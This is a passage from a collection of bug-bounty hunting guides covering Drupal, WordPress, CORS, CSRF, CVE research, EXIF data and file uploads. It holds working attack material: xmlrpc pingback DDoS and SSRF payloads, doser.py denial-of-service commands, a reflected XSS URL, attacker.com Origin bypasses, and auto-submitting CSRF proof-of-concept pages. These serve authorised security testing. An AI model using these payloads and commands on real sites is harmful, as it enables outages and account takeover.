      "Drupal.md": "## Drupal Nodes\r\n If you hunt on a Drupal website: fuzz with intruder on '/node/$' where '$' is a number (from 1 to 500 for example). \r\n You could find hidden pages (test, dev) which are not referenced by the search engines.\r\n\r\n* [Credits](https://twitter.com/adrien_jeanneau/status/1273952564430725123?t=SUinUf09jxjRXu1yF9AQDg&s=19)\r\n"
    },
    {
      "Moodle.md": "## Mass Hunting XSS — Moodle\r\n* [https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516](https://dewangpanchal98.medium.com/mass-hunting-xss-moodle-ed4b50c82516)\r\n\r\n## Author:\r\n[@th3.d1p4k](https://twitter.com/DipakPanchal05)\r\n"
    },
    {
      "wordpress.md": "# Wordpress Common Misconfiguration\r\nHere I will try my best to mention all common security misconfigurations for Wordpress I saw before or officially referenced. I will be attaching all poc and reference as well\r\n\r\n# Index\r\n* Wordpress Detection\r\n* General Scan Tool\r\n* xmlrpc.php\r\n* Directory listing\r\n* CVE-2018-6389\r\n* CVE-2021-24364\r\n* WP Cornjob DOS\r\n* WP User Enumeration\r\n\r\n# Wordpress Detection\r\nWell, if you are reading this you already know about technology detection tool and methods.\r\nStill adding them below\r\n* Wappalyzer\r\n* WhatRuns\r\n* BuildWith\r\n\r\n# Geneal Scan Tool\r\n* WpScan\r\n\r\n# xmlrpc.php \r\nThis is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well.\r\n\r\n### Detection\r\n* visit site.com/xmlrpc.php\r\n* Get the error message about POST request only\r\n\r\n### Exploit\r\n* Intercept the request and change the method GET to POST\r\n* List all Methods\r\n    ```\r\n    <methodCall>\r\n    <methodName>system.listMethods</methodName>\r\n    <params></params>\r\n    </methodCall>\r\n    ```\r\n* Check the ```pingback.ping``` mentod is there or not\r\n* Perform DDOS\r\n    ```\r\n    <methodCall>\r\n    <methodName>pingback.ping</methodName>\r\n    <params><param>\r\n    <value><string>http://<YOUR SERVER >:<port></string></value>\r\n    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>\r\n    </value></param></params>\r\n    </methodCall>\r\n    ```\r\n* Perform SSRF (Internal PORT scan only)\r\n    ```\r\n    <methodCall>\r\n    <methodName>pingback.ping</methodName>\r\n    <params><param>\r\n    <value><string>http://<YOUR SERVER >:<port></string></value>\r\n    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>\r\n    </value></param></params>\r\n    </methodCall>\r\n    ```\r\n### Tool To Automate XMLRPC-Scan.\r\n\r\n[XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan)\r\n\r\n### References\r\n[Bug Bounty Cheat Sheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)\r\n\r\n[Medium Writeup](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32)\r\n\r\n[WpEngine Blog Post](https://wpengine.com/resources/xmlrpc-php/)\r\n\r\n# Directory listing\r\nSometimes developers forget to disable the directory listing on /wp-content/uploads. So this is the common issue on wordpress sites.\r\n\r\n### Detection\r\n/wp-content/uploads\r\n\r\n### Pro tip\r\nAdd this path to your fuzzing wordlist\r\n\r\n### References\r\n[H1 Report](https://hackerone.com/reports/201984)\r\n[H1 Report](https://hackerone.com/reports/762118)\r\n[H1 Report](https://hackerone.com/reports/789388)\r\n[H1 Report](https://hackerone.com/reports/448985)\r\n\r\n# CVE-2018-6389\r\nThis issue can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3\r\n\r\n### Detection\r\nUse the URL from my gist called loadsxploit, you will get a massive js data in response.\r\n\r\n[loadsxploit](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)\r\n\r\n### Exploit\r\nYou can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second\r\n\r\n[Doser](https://github.com/quitten/doser.py)\r\n```\r\npython3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'\r\n```\r\n### References\r\n[H1 Report](https://hackerone.com/reports/752010)\r\n\r\n[CVE Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389)\r\n\r\n[Blog Post](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)\r\n\r\n# CVE-2021-24364\r\nThe Jannah WordPress theme before 5.4.4 did not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.\r\n\r\n### Detection and Exploit\r\n* Replace <Your_WP-Site-here> to your WP-site\r\n<Your_WP-Site-here>/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D\r\n* Wait for the pop-up!\r\n\r\n### Reference \r\n[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-24364)\r\n\r\n# WP Cornjob DOS\r\nThis is another area where you can perform a DOS attack.\r\n\r\n### Detection\r\n* visit site.com/wp-cron.php\r\n* You will see a Blank page with 200 HTTP status code\r\n\r\n### Exploit\r\nYou can use the same tool Doser for exploiting this \r\n```\r\npython3 doser.py -t 999 -g 'https://site.com/wp-cron.php'\r\n```\r\n### Reference\r\n\r\n[GitHub Issue](https://github.com/wpscanteam/wpscan/issues/1299)\r\n\r\n[Medium Writeup](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30)\r\n\r\n# WP User Enumeration\r\nThis issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff\r\n\r\n### Detection\r\n* visit site.com/wp-json/wp/v2/users/\r\n* You will see json data with user info in response\r\n\r\n### Exploit\r\nIf you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well\r\n\r\n### Reference\r\n[H1 Report](https://hackerone.com/reports/356047)\r\n\r\n# Researcher Note\r\nPlease do not depend on those issues at all. I saw people only looking for those issues and nothing else. Those are good to have a look while testing for other vulnerabilities and most of the time they work good for chaining with other low bugs.\r\n\r\n# Author\r\n**Name:** Mehedi Hasan Remon\r\n\r\n**Handle:** [@remonsec](https://twitter.com/remonsec)\r\n"
    }
  ],
  "CORS": [
    {
      "CORS.md": "# Misconfigured CORS\r\n Here are few methods and steps you can do to check for misconfigure cors.\r\n\r\n* Hunting method 1(Single target):\r\n\r\n```\r\nStep->1. Capture the target website and spider or crawl all the website using burp.\r\nStep->2. Use burp search look for Access-Control\r\nStep->3. Try to add Origin Header i.e,Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com\r\nStep->4  If origin is reflected in response means the target is vuln to CORS\r\n```\r\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n* Hunting method 2(mutliple means including subdomains):\r\n```\r\nstep 1-> find domains i.e subfinder -d target.com -o domains.txt\r\nstep 2-> check alive ones : cat domains.txt | httpx | tee -a alive.txt\r\nstep 3-> send each alive domain into burp i.e, cat alive.txt | parallel -j 10 curl --proxy \"http://127.0.0.1:8080\" -sk 2>/dev/null\r\nstep 4-> Repeat hunting method 1\r\n```\r\n-----------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n* Both above method are manual methods so lets check an automated way\r\n# Tools\r\n* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)\r\n* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)\r\n* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)\r\n* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)\r\n\r\n# Automate Way :\r\n```\r\nstep1-> find domains i.e, subfinder -d domain.com -o target.txt\r\nstep2-> grep alive: cat target.txt | httpx | tee -a alive.txt\r\nstep3-> grep all urls using waybackurls by @tomnomnom and gau tool i.e,cat alive.txt | gau | tee -a urls.txt\r\nstep4-> run any of these tools on each url \r\nstep5-> configure the manually\r\n```\r\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n# Another Method\r\n\r\n### Tools You Will Need for this method.\r\n* [https://github.com/tomnomnom/meg](https://github.com/tomnomnom/meg)\r\n* [https://github.com/tomnomnom/gf](https://github.com/tomnomnom/gf)\r\n* [https://github.com/projectdiscovery/subfinder](https://github.com/projectdiscovery/subfinder)\r\n* [https://github.com/tomnomnom/assetfinder](https://github.com/tomnomnom/assetfinder)\r\n* [https://github.com/Edu4rdSHL/findomain](https://github.com/Edu4rdSHL/findomain)\r\n* [https://github.com/projectdiscovery/httpx](https://github.com/projectdiscovery/httpx)\r\n         \r\n### Steps\r\n```\r\n1) Find Domains with the help of subfinder,assetfinder,findomain i.e , subfinder -d target.com | tee -a hosts1 , findomain -t target.com | tee -a hosts1 , assetfinder --subs-only target.com |tee -a hosts1 .\r\n2) Then cat hosts1 | sort -u | tee -a hosts2 and then cat hosts2 | httpx | tee -a hosts .\r\n3) Navigate through terminal where hosts file is located  echo \"/\" > paths\r\n4) Then type meg -v\r\n5) After the completion of process type gf cors.\r\n6) All the urls with Access-Control-Allow will be displayed.  \r\n```\r\n\r\n# Authors\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n"
    },
    {
      "CORS_Bypasses.md": "# CORS Bypass\t\r\n1. `Origin:null`\r\n2. `Origin:attacker.com`\r\n3. `Origin:attacker.target.com`\r\n4. `Origin:attackertarget.com`\r\n5. `Origin:sub.attackertarget.com`\r\n6. `Origin:attacker.com and then change the method Get to post/Post to Get`\r\n7. `Origin:sub.attacker target.com`\r\n8. `Origin:sub.attacker%target.com`\r\n9. `Origin:attacker.com/target.com`\r\n\r\n### Authors\r\n\r\n* [@tamimhasan404](https://twitter.com/tamimhasan404)\r\n\t\r\n# Reference Tweets\r\nhttps://twitter.com/trbughunters/status/1287023673845612546\r\n\r\nhttps://twitter.com/Paresh_parmar1/status/1265251507655630848\r\n\r\nhttps://twitter.com/Alra3ees/status/1141504347089584128\r\n"
    }
  ],
  "CSRF": [
    {
      "Cross_Site_Request_Forgery_Bypass.md": "**Cross Site Request Forgery(CSRF)**\r\n\r\nHello Guys, I Tried My Best To Share all The CSRF Bypasses I Know.\r\nI Hope This Will Help You.\r\n\r\nCsrf will be login, logout, resetpass, change password, add-cart, like, comment, profie change, user details change, blance transffer, subscription ect\r\n```\r\n-Change Request Method [POST => GET]\r\n\r\n-Remove Total Token Parameter\r\n\r\n-Remove The Token, And Give a Blank Parameter\r\n\r\n-Copy a Unused Valid Token , By Dropping The Request and Use That Token\r\n\r\n-Use Own CSRF Token To Feed it to Victim\r\n\r\n-Replace Value With Of A Token of Same Length \r\n\r\n-Reverse Engineer The Token\r\n\r\n-Extract Token via HTML injection\r\n\r\n-Switch From Non-Form `Content-Type: application/json` or `Content-Type: application/x-url-encoded` To `Content-Type: form-multipart`\r\n\r\n-Change/delete the last or frist character from the token\r\n\r\n-Change referrer to Referrer\r\n\r\n-Bypass the regex\r\n  If the site is looking for “bank.com” in the referer URL, maybe “bank.com.attacker.com” or “attacker.com/bank.com” will work.\r\n    \r\n-Remove the referer header (add this <meta name=”referrer” content=”no-referrer”> in your payload or html code)\r\n\r\n-Clickjacking\r\n\r\n  (If you aren’t familiar with clickjacking attacks, more information can be found https://owasp.org/www-community/attacks/Clickjacking.)\r\n  Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where   the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF   attack on the endpoint, albeit with a bit more effort.\r\n\t\r\n\r\n\r\n```\r\n\r\n### References\r\n[Medium Writeup](https://medium.com/swlh/intro-to-csrf-cross-site-request-forgery-9de669df03de)\r\n\r\n[Medium Writeup](https://medium.com/swlh/attacking-sites-using-csrf-ba79b45b6efe)\r\n\r\n[Medium Writeup](https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee)\r\n\r\n\r\n### Authors\r\n* [@SMHTahsin33](https://twitter.com/SMHTahsin33)\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n* [@remonsec](https://twitter.com/remonsec)\r\n* [@tamimhasan404](https://twitter.com/tamimhasan404)\r\n\r\n"
    },
    {
      "CSRF.md": "# Introduction\r\n\r\nCross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.\r\n\r\nFor a CSRF attack to be possible, three key conditions must be in place:\r\n\r\n- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).\r\n\r\n- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.\r\n- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.\r\n\r\nAlthough CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-based authentication.\r\n\r\n- Basic Payload to automatically submit the request when the web page opens.\r\n    \r\n    ```markdown\r\n    <html>\r\n      <body>\r\n        <form action=\"https://vulnerable-website.com/email/change\" method=\"POST\">\r\n          <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\" />\r\n        </form>\r\n        <script>\r\n          document.forms[0].submit();\r\n        </script>\r\n      </body>\r\n    </html>\r\n    ```\r\n    \r\n\r\n# Testing CSRF\r\n\r\n## Base Steps:\r\n\r\n```markdown\r\n1. Select a request anywhere in Burp Suite Professional that you want to test or exploit.\r\n2. From the right-click context menu, select Engagement tools / Generate CSRF PoC.\r\n3. Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).\r\n4. You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.\r\n5. Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.\r\n```\r\n\r\n### Bypass Method -1 : Change the request method `POST` → `GET`\r\n\r\n```markdown\r\nTest Case: Validation of CSRF token depends on request method\r\n\r\n1. Interect with functionality and intercept the request.\r\n2. Send this requets to repeater and right click change request method\r\n3. Remove any csrf param and genrate csrf poc\r\n4. Edit according to your preference,For example:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"GET\" action=\"https://ac591fd21f4ab3d2807a1b1d0007000d.web-security-academy.net:443/email/change-email?email=natsu%40natsu.com\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\r\n\t</form>\r\n<script>\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n5. Done send this to victim.\r\n```\r\n\r\n### Bypass Method - 2: Remove csrf param from `POST` request.\r\n\r\n```markdown\r\nTest Case: Validation of CSRF token depends on token being present\r\n\r\n1. Interect with functionality and intercept the request.\r\n2. Send this requets to repeater.\r\n3. Remove any csrf param and generate csrf poc\r\n4. Edit according to your preference,For example:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\r\n\t</form>\r\n<script>\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n5. Done send this to victim.\r\n```\r\n\r\n### Bypass Method - 3: Feed your own account generated CSRF token in attack.\r\n\r\n```markdown\r\nTest Case: CSRF token is not tied to the user session.\r\n\r\n1. Interect with functionality and intercept the request.\r\n2. Right click generate csrf poc.\r\n3. Copy the code in a file.html remove any session token\r\n4. Drop the request.\r\n5. Send the file.html to victim.\r\n\r\nExample CSRF Code:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://acd81f251e0c762980c31ae600c70041.web-security-academy.net:443/email/change-email\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\r\n\t\t<input type=\"text\" name=\"csrf\" value=\"NqdmYFyfHgQl8JWLKd7YTOC24Tqdedpw\">\r\n\t</form>\r\n<script>\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n```\r\n\r\n### Bypass Method - 4 : Chain any other vulnerability to add your cookie for example `XSS`, `CRLF` → `CSRF`\r\n\r\n```markdown\r\nTest Case - 1 : CSRF token is tied to a non-session cookie, when we have two csrf token one in cookie and other in the functionality this is due to presence of two framework one for session handling and one for CSRF protection, which are not integrated together.\r\n\t\t\t\t\t The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com.\r\n\r\n1. Find any vulnerability which allow you to inject something in the cookie of victim.\r\n2. Test if CSRF token is tied to session id (try changing session id keeping everything as it is))\r\n3. Check if the your csrf token works when replaced in victims request\r\n4. Lastly check if you can inject CRLF and change csrf cookie value\r\n5. Done now make a csrf poc with xss payload which execute crlf and send this poc to victim\r\n\r\nExample CSRF Code:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac981fc81ee9f58b80984ae400200076.web-security-academy.net:443/my-account/change-email\">\r\n\t\t<input type=\"text\" name=\"csrfKey\" value=\"ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"hehe@hehe.com\">\r\n\t\t<input type=\"text\" name=\"csrf\" value=\"6EU5SJ9YKzfOsq9rNgDR8toGy0TKSw81\">\r\n\t\t<input type=\"submit\" value=\"Send\">\r\n\t</form>\r\n<img src=\"http://ac981fc81ee9f58b80984ae400200076.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ntq9GTrV4JhtLaX07sqTnMpOHwMGpaX9\" onerror=\"document.forms[0].submit()\">\r\n</body>\r\n</html>\r\n\r\n\r\nTest Case - 2 : CSRF token is simply duplicated in a cookie, here csrf token value can be anything just need to be same in cookie as wells as param. \r\n\r\n1. Intercept and action and try changing csrf token in both cookie and param\r\n2. Make similar poc as above but this time put same csrf token in crlf payload and request param.\r\n3. Done, Send it to victim.\r\n\r\nExample CSRF POC:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac071f601e8dc74380609c1d000900b3.web-security-academy.net:443/my-account/change-email\">\r\n\t\t<input type=\"text\" name=\"csrf\" value=\"K5r92qL9pGzpC2joPMkqgBSY1GG3eo6I\">\r\n\t\t<input type=\"text\" name=\"session\" value=\"xdCFpxBe1M0MHvk0DmFuzCRlImMgdxZk\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\r\n\t\t<input type=\"text\" name=\"csrf\" value=\"fake\">\r\n\t\t<input type=\"submit\" value=\"Send\">\r\n\t</form>\r\n<img src=\"http://ac071f601e8dc74380609c1d000900b3.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake\" onerror=\"document.forms[0].submit()\">\r\n</body>\r\n</html>\r\n\r\n```\r\n\r\n## Bypass Method - 5 : Delete the Referrer Header Completely or Suppress it.\r\n\r\n```markdown\r\nTest Case: CSRF where Referer validation depends on header being present.\r\n\r\n1. Intercept the request and try changing referer to some other domain.\r\n2. If that didn't work then you will have to suppress the refere header.\r\n3. you can use `<meta name=\"referrer\" content=\"no-referrer\">` or any other technique.\r\n4. Done, Make a normal POC with that technique.\r\n\r\nExample CSRF POC:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac6d1fe21fb2a0c7809510e7001c006c.web-security-academy.net:443/my-account/change-email\">\r\n\t\t<input type=\"text\" name=\"session\" value=\"S4dyJbRWg1IqEpZlPkhICE5vJQhnv6ve\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"hola@hola.com\">\r\n<meta name=\"referrer\" content=\"no-referrer\">\r\n\t</form>\r\n<script>\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n```\r\n\r\n## Bypass Method - 6 : Try [attacker.com](http://attacker.com) or similar payload in referer header. (Validation of Referer can be circumvented)\r\n\r\n```markdown\r\nTest case: CSRF with broken Referer validation\r\n\r\n1. Intercept the request and try changing referer to some other domain. (Check all cases how it is been verified)\r\n2. Now Generate a normal POC and include any JavaScript in the script block to alter the URL and Referer\r\n3. Done Send it to victim.\r\n\r\nExample CSRF POC:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac761f621f79d75680e4054c00160033.web-security-academy.net:443/my-account/change-email\">\r\n\t\t<input type=\"text\" name=\"session\" value=\"rk13v2KYDFByO0OFL0xnHcnIVZbvAHNg\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"gg@gg.com\">\r\n\t\t<input type=\"submit\" value=\"Send\">\r\n\t</form>\r\n<script>\r\n\t\t\thistory.pushState(\"\", \"\", \"/?ac761f621f79d75680e4054c00160033.web-security-academy.net\")\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n```\r\n\r\n## Bypass Method - 7: Send `null` value in csrf token.\r\n\r\n```markdown\r\nTest Case: Validation of CSRF token depends on token value being\r\n\r\n1. Interect with functionality and intercept the request.\r\n2. Send this requets to repeater.\r\n3. Add null csrf param and generate csrf poc\r\n4. Edit according to your preference,For example:\r\n\r\n<!DOCTYPE html>\r\n<html>\r\n  <!-- CSRF PoC - generated by Burp Suite i0 SecLab plugin -->\r\n<body>\r\n\t<form method=\"POST\" action=\"https://ac8a1fbd1e6d76ae806817f900d50032.web-security-academy.net:443/email/change-email\">\r\n\t\t<input type=\"text\" name=\"email\" value=\"natsu@natsu.com\">\r\n\t</form>\r\n<script>\r\n      document.forms[0].submit();\r\n    </script>\r\n</body>\r\n</html>\r\n\r\n5. Done send this to victim.\r\n```\r\n\r\n# Mitigation\r\n\r\n- Defending against CSRF with SameSite cookies\r\n    \r\n    - The `SameSite` attribute can be used to control whether and how cookies are submitted in cross-site requests. By setting the attribute on session cookies, an application can prevent the default browser behavior of automatically adding cookies to requests regardless of where they originate.\r\n    \r\n   -  The `SameSite` attribute is added to the `Set-Cookie` response header when the server issues a cookie, and the attribute can be given two values, `Strict` or `Lax`. For example:\r\n    \r\n    `SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;`\r\n    \r\n    `SetCookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;`\r\n    \r\n    - If the `SameSite` attribute is set to `Strict`, then the browser will not include the cookie in any requests that originate from another site. This is the most defensive option, but it can impair the user experience, because if a logged-in user follows a third-party link to a site, then they will appear not to be logged in, and will need to log in again before interacting with the site in the normal way.\r\n    \r\n    - If the `SameSite` attribute is set to `Lax`, then the browser will include the cookie in requests that originate from another site but only if two conditions are met:\r\n    \r\n    - The request uses the GET method. Requests with other methods, such as POST, will not include the cookie.\r\n    - The request resulted from a top-level navigation by the user, such as clicking a link. Other requests, such as those initiated by scripts, will not include the cookie.\r\n    \r\n  -   Using `SameSite` cookies in `Lax` mode does then provide a partial defense against CSRF attacks, because user actions that are targets for CSRF attacks are often implemented using the POST method. Two important caveats here are:\r\n    \r\n    - Some applications do implement sensitive actions using GET requests.\r\n    - Many applications and frameworks are tolerant of different HTTP methods. In this situation, even if the application itself employs the POST method by design, it will in fact accept requests that are switched to use the GET method.\r\n    \r\n    For the reasons described, it is not recommended to rely solely on SameSite cookies as a defense against CSRF attacks. Used in conjunction with [CSRF tokens](https://portswigger.net/web-security/csrf/tokens), however, SameSite cookies can provide an additional layer of defense that might mitigate any defects in the token-based defenses.\r\n    \r\n- Using CSRF Token\r\n    \r\n    The most robust way to defend against CSRF attacks is to include a [CSRF token](https://portswigger.net/web-security/csrf/tokens) within relevant requests. The token should be:\r\n    \r\n    - Unpredictable with high entropy, as for session tokens in general.\r\n    - Tied to the user's session.\r\n    - Strictly validated in every case before the relevant action is executed.\r\n    \r\n\r\n# Reference\r\n\r\n[What is CSRF (Cross-site request forgery)? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/csrf)\r\n\r\n[Top 25 CSRF Bug Bounty Reports](https://corneacristian.medium.com/top-25-csrf-bug-bounty-reports-ffb0b61afa55)\r\n\r\n[KathanP19/HowToHunt](https://github.com/KathanP19/HowToHunt/blob/master/CSRF/Cross_Site_Request_Forgery_Bypass.md)\r\n\r\n- Checklist\r\n    \r\n[object Promise]\r\n    \r\n\r\n[object Promise]\r\n\r\n## Author:\r\n[KathanP19](https://twitter.com/KathanP19)\r\n"
    },
    {
      "README.md": "# Some MindMap\r\n---\r\n### 6 CSRF Bypass by Hack3rSr0lls\r\n[object Promise]\r\n\r\n### CSRF Mindmap\r\n[object Promise]\r\n\r\n### Source\r\n* [https://twitter.com/hackerscrolls/status/1265217322308046849](https://twitter.com/hackerscrolls/status/1265217322308046849)\r\n\r\n### Author\r\n* [KathanP19](https://twitter.com/KathanP19)\r\n"
    }
  ],
  "CVES": [
    {
      "easycve.md": "# Easy CVES using Researching\r\n  \r\n### Tools\r\n* Google\r\n* Twitter\r\n* Nuclei\r\n  \r\n## Steps:\r\n```\r\n    1.Grab all the subdomains i.e, subfinder -d domain.com | tee -a domains.txt\r\n    2.Grap all alive domains i.e,  cat domains.txt | httpx -status-code | grep 200 | cut -d \" \" -f1 | tee -a alive.txt\r\n    3.Run nuclei basic-detection,panels,workflows,cves templates differently and store results in different file. i.e, cat alive.txt | nuclei -t nuclei-templates/workflows | tee -a workflows.\r\n    4.Read each output carefully with patience.\r\n    5.Find interest tech used by target. i.e, jira\r\n    6.put that link into browser check the version used by target.\r\n    7.Go on google search with jira version exploit.\r\n    8.grep the cves\r\n    9.Go to twitter in explore tab search CVE(that you found from google) poc or CVE exploit\r\n    10.Go to google and put cve or some details grab from  twitter for a better poc read writeups related to that.\r\n    11.Try all cves if success report it.:)\r\n ```   \r\n\r\n### Authors\r\n* [@Virdoex_hunter](https://twitter.com/Virdoex_hunter)\r\n    \r\n    \r\n    \r\n"
    }
  ],
  "EXIF_Geo_Data_Not_Stripped": [
    {
      "exif_geo.md": "<h4>Summary:</h4>\r\nWhen a user uploads an image in example.com, the uploaded image’s EXIF Geolocation Data does not gets stripped. As a result, anyone can get sensitive information of example.com users like their Geolocation, their Device information like Device Name, Version, Software & Software version used etc.\r\n\r\n<h4>Steps to reproduce:</h4>\r\n\r\n1. Got to Github ( https://github.com/ianare/exif-samples/tree/master/jpg) <br>\r\n2. There are lot of images having resolutions (i.e 1280 * 720 ) , and also whith different MB’s . <br>\r\n3. Go to Upload option on the website <br>\r\n4. Upload the image<br>\r\n5. see the path of uploaded image ( Either by right click on image then copy image address OR right click, inspect the image, the URL will come in the inspect ,   edit it as html )</br>\r\n6. open it (http://exif.regex.info/exif.cgi)</br>\r\n7. See wheather is that still showing exif data , if it is then Report it.\r\n\r\n# Reports (Hackerone)\r\n\r\n- [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)\r\n\r\n# Author\r\n* [@0xd3vil](https://twitter.com/0xd3vil)\r\n* [@klaus](https://twitter.com/klaus_dev)\r\n"
    }
  ],
  "File_Upload": [
    {
      "file_upload.md": "# Introduction\r\n\r\n- File upload vulnerability is a noteworthy issue with online applications. If a web application has this type of vulnerability, an aggressor can upload a file with malicious code in it that can be executed on the server. An assailant may most likely put a phishing page into the site or mutilate it to uncover internal data of the web server to other people.\r\n- Allowing file uploads by end-users, especially if done without a full understanding of the risks associated with it, is akin to opening the floodgates for server compromise. Naturally, despite the security concerns surrounding the ability for end-users to upload files, it is an increasingly common requirement in modern web applications.\r\n- File uploads carry a significant risk that not many are aware of, or how to mitigate against abuses. Worst still, several web applications contain insecure, unrestricted file upload mechanisms.\r\n- Make sure you read \"**First Link in the Reference!!**\" its a great blog then proceed further.\r\n\r\n**What can you achieve by exploiting file-upload:**\r\n\r\n- Remote code execution\r\n- SSRF\r\n- XSS\r\n- LFI\r\n- XXE\r\n- Phishing\r\n- Parameter pollution\r\n- uploaders may disclose internal paths\r\n- [SQL injection](https://security.stackexchange.com/questions/29014/are-image-uploads-also-vulnerable-to-sql-injection)\r\n- DoS attack\r\n- Many More...\r\n\r\n**What extension can lead to what if uploaded successfully:**\r\n\r\n- Extensions Impact\r\n    - `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE\r\n    - `SVG`: Stored XSS, 